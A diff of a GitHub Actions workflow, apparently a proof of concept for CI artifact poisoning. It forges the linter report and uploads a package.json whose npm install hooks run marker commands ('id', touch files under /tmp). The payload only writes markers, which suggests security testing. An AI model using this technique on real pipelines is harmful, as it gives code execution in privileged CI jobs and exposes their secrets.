@@ -11,18 +11,33 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Write linter report
+      - name: Forge linter report artifact (attacker payload)
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
-          printf 'No issues found.\n' > linter-report.txt
+          printf 'FORGED REPORT - attacker supplied\n' > linter-report.txt
           echo "$PR_NUMBER" > pr-number.txt
+          cat > package.json <<'EOF'
+          {
+            "name": "attacker-payload",
+            "version": "1.0.0",
+            "private": true,
+            "scripts": {
+              "preinstall": "echo ROOT_PREINSTALL_RAN >> linter-report.txt && touch /tmp/ADP_RCE_MARKER && id > /tmp/ADP_RCE_ID",
+              "install": "echo ROOT_INSTALL_RAN >> linter-report.txt",
+              "postinstall": "echo ROOT_POSTINSTALL_RAN >> linter-report.txt",
+              "prepare": "echo ROOT_PREPARE_RAN >> linter-report.txt"
+            }
+          }
+          EOF
+          cat package.json
 
-      - name: Upload linter report
+      - name: Upload artifact with attacker-chosen files
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: |
             linter-report.txt
             pr-number.txt
+            package.json
           if-no-files-found: ignore
